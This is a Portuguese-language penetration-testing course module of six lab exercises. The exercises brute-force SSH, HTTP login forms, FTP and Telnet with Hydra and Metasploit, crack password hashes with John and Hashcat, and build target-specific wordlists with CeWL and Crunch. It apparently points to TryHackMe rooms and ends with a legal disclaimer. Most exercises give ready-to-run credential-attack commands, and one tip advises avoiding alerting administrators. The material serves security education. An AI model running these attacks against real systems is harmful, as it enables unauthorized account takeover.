# 🔓 Módulo 4 — Labs de Exploração

> Laboratórios práticos de força bruta, cracking de hashes e exploração de autenticação.

---

## Pré-requisitos

| Item | Mínimo | Recomendado |
|------|--------|-------------|
| Sistema | Linux (Kali/Parrot) | Kali 2024+ |
| RAM | 4 GB | 8 GB |
| Disco | 20 GB livre | 50 GB |
| Ferramentas | hydra, john, hashcat | + metasploit, crunch, cewl |
| Conhecimento | Módulos 1-3 concluídos | — |
| Network | Acesso a máquinas THM | Labs locais |

---

## Exercício 1: Brute Force SSH com Hydra

⏱ **Tempo estimado:** 30 min

### 🎯 Objetivo
Quebrar senha de um serviço SSH usando ataque de força bruta com a ferramenta Hydra.

### 📚 Conhecimentos Necessários
- Conceito de brute force e dicionário de senhas
- Funcionamento do protocolo SSH (porta 22)
- Taxa de tentativas (rate limiting)
- Diferença entre user list e password list

### 🛠 Ferramentas
- `hydra` — ferramenta de brute force
- Wordlists (`/usr/share/wordlists/rockyou.txt`)

### 📋 Passo a Passo

1. Verifique se o SSH está acessível:
```bash
nmap -sV -p 22 <IP_ALVO>
```

2. Crie um arquivo com usuários (`users.txt`):
```
admin
root
user
test
```

3. Execute o brute force com Hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP_ALVO> -t 4 -V
```

4. Aguarde o resultado — a senha correta será exibida.

### 💡 Macetes
- **`-l`** — specifies single username
- **`-L`** — specifies user list file
- **`-P`** — specifies password list file
- **`-t 4`** — limits threads (NUNCA use 64+! será bloqueado)
- **`-V`** — verbose (mostra cada tentativa)
- **`-f`** — para na primeira credencial encontrada
- Se bloqueado, tente `-t 1` ou adicione delay com `-w 3`

### ✅ Checklist
- [ ] Identifiquei o serviço SSH rodando na máquina alvo
- [ ] Criei um arquivo de usuários adequado
- [ ] Executei o Hydra com rate limiting adequado
- [ ] Obtive as credenciais corretas
- [ ] Conectei no SSH com as credenciais descobertas

### 📎 Links
- [TryHackMe — Brute It](https://tryhackme.com/room/bruteit)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)

---

## Exercício 2: Brute Force HTTP Login

⏱ **Tempo estimado:** 35 min

### 🎯 Objetivo
Quebrar o login de um formulário web usando força bruta HTTP POST com Hydra.

### 📚 Conhecimentos Necessários
- Formulários HTTP POST e como funcionam
- Campos ocultos (hidden fields) e tokens CSRF
- Interceptação de requests com Burp Suite
- Análise de respostas HTTP (F=flag de falha)

### 🛠 Ferramentas
- `hydra` — brute force HTTP
- `burp suite` — interceptação de tráfego (opcional)

### 📋 Passo a Passo

1. Acesse o formulário de login no navegador.

2. Intercepte o request com Burp ou inspecione o formulário (F12).

3. Identifique:
   - Path do POST (ex: `/login`)
   - Nome dos campos (`user`, `pass`, etc.)
   - Mensagem de erro exibida em login falho (ex: `Invalid credentials`)

4. Execute o Hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_ALVO> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" -t 5 -V
```

5. Analise o output para encontrar as credenciais corretas.

### 💡 Macetes
- **Formato:** `http-post-form "path: dados_do_post:F=string_de_falha"`
- **`^USER^` e `^PASS^`** — placeholders que o Hydra substitui
- **`F=`** — flag que indica falha (string exata da mensagem de erro)
- **`S=`** — flag que indica sucesso (alternativa ao F)
- Use Burp para ver o request exato antes de montar o comando
- Se houver campo hidden (ex: `csrf_token`), inclua-o: `&csrf=valor_fixo`

### ✅ Checklist
- [ ] Interceptei o request HTTP POST do login
- [ ] Identifiquei os nomes dos campos corretamente
- [ ] Identifiquei a mensagem de erro em login inválido
- [ ] Montei o comando Hydra correto
- [ ] Obtive as credenciais válidas
- [ ] Fiz login no site com as credenciais

### 📎 Links
- [TryHackMe — DVWA](https://tryhackme.com/room/dvwa)
- [Hydra HTTP Forms — THC Docs](https://github.com/vanhauser-thc/thc-hydra)

---

## Exercício 3: Identificar e Quebrar Hashes

⏱ **Tempo estimado:** 40 min

### 🎯 Objetivo
Identificar o tipo de hash e quebrá-lo utilizando John the Ripper ou Hashcat.

### 📚 Conhecimentos Necessários
- Tipos comuns de hash (MD5, SHA-1, SHA-256, NTLM, bcrypt)
- Diferença entre rainbow tables e brute force
- Formatos de hash suportados por John/Hashcat
- Wordlists e regras de mutação

### 🛠 Ferramentas
- `hashid` — identificação de hashes
- `john` — John the Ripper
- `hashcat` — cracking de hashes (GPU)
- `hash-identifier` — alternativa ao hashid

### 📋 Passo a Passo

1. Identifique o tipo do hash:
```bash
hashid '<hash>'
# ou
hash-identifier
```

2. O hashid mostrará os formatos possíveis. Anote o mais provável.

3. **Com John the Ripper:**
```bash
# Salve o hash em um arquivo hash.txt
echo '<hash>' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

4. **Com Hashcat:**
```bash
# MD5 = -m 0
hashcat -m 0 '<hash>' /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

5. Se não quebrar, tente regras:
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
```

### 💡 Macetes
- **Sempre identifique o hash antes** — usar formato errado não funciona
- **Tabelas de referência:**
  | Hash | John Format | Hashcat -m |
  |------|-------------|------------|
  | MD5 | `raw-md5` | `0` |
  | SHA-1 | `raw-sha1` | `100` |
  | SHA-256 | `raw-sha256` | `1400` |
  | NTLM | `nt` | `1000` |
  | bcrypt | `bcrypt` | `3200` |
- **Hashcat** é mais rápido (usa GPU), **John** é mais flexível
- Se o hash tiver salt, será necessário formato específico (ex: md5crypt = `-m 500`)

### ✅ Checklist
- [ ] Identifiquei o tipo do hash com hashid
- [ ] Determinei o formato correto para John/Hashcat
- [ ] Executei o cracking com wordlist padrão
- [ ] Obtenha a senha em texto plano
- [ ] (Bônus) Tentei com regras de mutação

### 📎 Links
- [TryHackMe — Hashing Fun](https://tryhackme.com/room/hashingfun)
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

## Exercício 4: Cracking com Wordlists Customizadas

⏱ **Tempo estimado:** 25 min

### 🎯 Objetivo
Criar wordlists personalizadas para um alvo específico usando CeWL e Crunch.

### 📚 Conhecimentos Necessários
- Coleta de palavras de sites (OSINT)
- Padrões de senhas comuns (nome+ano, empresa+numeros)
- Geração de combinações com Crunch
- Uso de CeWL para scraping de websites

### 🛠 Ferramentas
- `cewl` — gera wordlists a partir de websites
- `crunch` — gera combinações de caracteres
- `cat`, `sort`, `uniq` — manipulação de texto

### 📋 Passo a Passo

1. **CeWL — wordlist a partir de um site:**
```bash
cewl https://site-do-alvo.com -w site_words.txt -d 3 -m 5
```

2. **Análise e limpeza do output:**
```bash
sort site_words.txt | uniq > site_words_clean.txt
wc -l site_words_clean.txt
```

3. **Crunch — gerar combinações:**
```bash
# Formato: min-max charset
crunch 6 8 -t @@@%%% -o wordlist.txt
# @ = minúsculas, , = maiúsculas, % = números
```

4. **Combinar wordlists:**
```bash
cat rockyou.txt site_words.txt custom.txt | sort | uniq > combined.txt
```

5. **Usar a wordlist no Hydra/John:**
```bash
hydra -l admin -P combined.txt ssh://<IP_ALVO> -t 4
```

### 💡 Macetes
- **CeWL flags úteis:**
  - `-d` — profundidade de links (default: 1)
  - `-m` — tamanho mínimo da palavra
  - `-w` — arquivo de saída
  - `--lowercase` — converte para minúsculas
- **Crunch pattern syntax:**
  - `@` = minúsculas
  - `,` = maiúsculas
  - `%` = números
  - `^` = símbolos
- Se o site tiver login, primeiro faça scraping de metadados, FAQs, blog posts
- Combine sempre: wordlist padrão + wordlist customizada

### ✅ Checklist
- [ ] Identifiquei o site/empresa do alvo
- [ ] Usei CeWL para gerar wordlist do site
- [ ] Limpei e deduplici o output
- [ ] Criei combinações com Crunch (se aplicável)
- [ ] Combinei wordlists para ataque final
- [ ] Testei a wordlist em um serviço

### 📎 Links
- [TryHackMe — Brute It](https://tryhackme.com/room/bruteit)
- [CeWL GitHub](https://github.com/digininja/CeWL)

---

## Exercício 5: Brute Force com Metasploit

⏱ **Tempo estimado:** 35 min

### 🎯 Objetivo
Utilizar os auxiliary scanners do Metasploit para realizar ataques de brute force contra serviços de rede.

### 📚 Conhecimentos Necessários
- Arquitetura do Metasploit (exploits, auxiliary, payloads)
- Módulos de brute force do MSF
- Configuração de threads e credenciais
- Diferença entre Metasploit e Hydra

### 🛠 Ferramentas
- `msfconsole` — console principal do Metasploit
- Módulos `auxiliary/scanner/*`

### 📋 Passo a Passo

1. Inicie o Metasploit:
```bash
msfconsole
```

2. **SSH Brute Force:**
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP_ALVO>
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
run
```

3. **FTP Brute Force:**
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <IP_ALVO>
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
run
```

4. **Telnet Brute Force:**
```bash
use auxiliary/scanner/telnet/telnet_login
set RHOSTS <IP_ALVO>
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 3
run
```

5. Se encontrar credenciais, use `sessions -i 1` para interagir.

### 💡 Macetes
- **Sempre defina THREADS** — padrão é 1 (muito lento), recomendo 3-5
- Módulos comuns de brute force:
  | Serviço | Módulo |
  |---------|--------|
  | SSH | `auxiliary/scanner/ssh/ssh_login` |
  | FTP | `auxiliary/scanner/ftp/ftp_login` |
  | Telnet | `auxiliary/scanner/telnet/telnet_login` |
  | SMB | `auxiliary/scanner/smb/smb_login` |
  | RDP | `auxiliary/scanner/rdp/rdp_login` |
- Use `set VERBOSE true` para ver tentativas
- Se bloqueado, mude para `THREADS 1` e aguarde

### ✅ Checklist
- [ ] Iniciei o Metasploit corretamente
- [ ] Selecioni o módulo scanner adequado ao serviço
- [ ] Configurei HOST, USERNAME e PASS_FILE
- [ ] Defini threads adequadas (3-5)
- [ ] Executei o scan e analisei o output
- [ ] Obtive credenciais funcionais (se aplicável)

### 📎 Links
- [TryHackMe — Metasploit Intro](https://tryhackme.com/room/metasploitintro)
- [Metasploit Documentation](https://docs.metasploit.com/)

---

## Exercício 6: Pentest de Autenticação (Desafio Final)

⏱ **Tempo estimado:** 60 min

### 🎯 Objetivo
Realizar teste completo de autenticação em uma máquina alvo, aplicando todas as técnicas estudadas no módulo.

### 📚 Conhecimentos Necessários
- Todas as técnicas dos exercícios 1-5
- Planejamento de pentest
- Documentação de tentativas
- Análise de resultados e relatório

### 🛠 Ferramentas
- `hydra` — brute force SSH, HTTP, FTP
- `john` / `hashcat` — cracking de hashes
- `metasploit` — scanners auxiliares
- `cewl` / `crunch` — wordlists customizadas

### 📋 Passo a Passo

1. **Reconhecimento:**
```bash
nmap -sV -sC -p- <IP_ALVO>
```

2. **Listar todos os serviços** encontrados e seus métodos de autenticação.

3. **SSH:**
```bash
hydra -l root -P wordlist.txt ssh://<IP_ALVO> -t 4 -V
```

4. **HTTP:**
```bash
hydra -l admin -P wordlist.txt <IP_ALVO> http-post-form "/login:user=^USER^&pass=^PASS^:F=error" -t 5
```

5. **FTP:**
```bash
hydra -l anonymous -P wordlist.txt ftp://<IP_ALVO> -t 4
```

6. **Se encontrar hashes:** quebre com John/Hashcat.

7. **Se encontrar serviços Metasploit:** use auxiliary scanners.

8. **Documente cada tentativa** em um relatório.

### 💡 Macetes
- **Fluxo recomendado:**
  1. Enumerar todos os serviços (nmap)
  2. Identificar métodos de autenticação
  3. Testar credenciais padrão (admin:admin, admin:password)
  4. Brute force com wordlist padrão
  5. Wordlist customizada (CeWL + Crunch)
  6. Quebrar hashes encontrados
  7. Documentar tudo
- **Rate limiting:** se bloqueado, diminua threads ou espere
- **Credenciais comuns:** admin, root, administrator, test, user
- **Não deixe rastros** — muitas tentativas podem alertar o admin

### ✅ Checklist
- [ ] Fiz reconhecimento completo (nmap)
- [ ] Identifiquei todos os serviços com autenticação
- [ ] Testei credenciais padrão em cada serviço
- [ ] Executei brute force em SSH/HTTP/FTP
- [ ] Quebrei hashes (se encontrados)
- [ ] Documentei cada tentativa
- [ ] Obtive root/admin em pelo menos um serviço
- [ ] Montei relatório final

### 📎 Links
- [TryHackMe — DVWA](https://tryhackme.com/room/dvwa)
- [TryHackMe — Brute It](https://tryhackme.com/room/bruteit)
- [PayloadsAllTheThings — Brute Force](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Brute%20Force.md)

---

## 📊 Resumo dos Labs

| # | Exercício | Ferramentas | Tempo |
|---|-----------|-------------|-------|
| 1 | Brute Force SSH | hydra | 30 min |
| 2 | Brute Force HTTP | hydra, burp | 35 min |
| 3 | Quebra de Hashes | hashid, john, hashcat | 40 min |
| 4 | Wordlists Customizadas | cewl, crunch | 25 min |
| 5 | Brute Force Metasploit | msfconsole | 35 min |
| 6 | Pentest Autenticação | Todas | 60 min |

---

> ⚠️ **AVISO LEGAL:** Estes labs são para fins educacionais. Pratique apenas em ambientes que você tem autorização para testar. Ataques a sistemas sem autorização são crime.
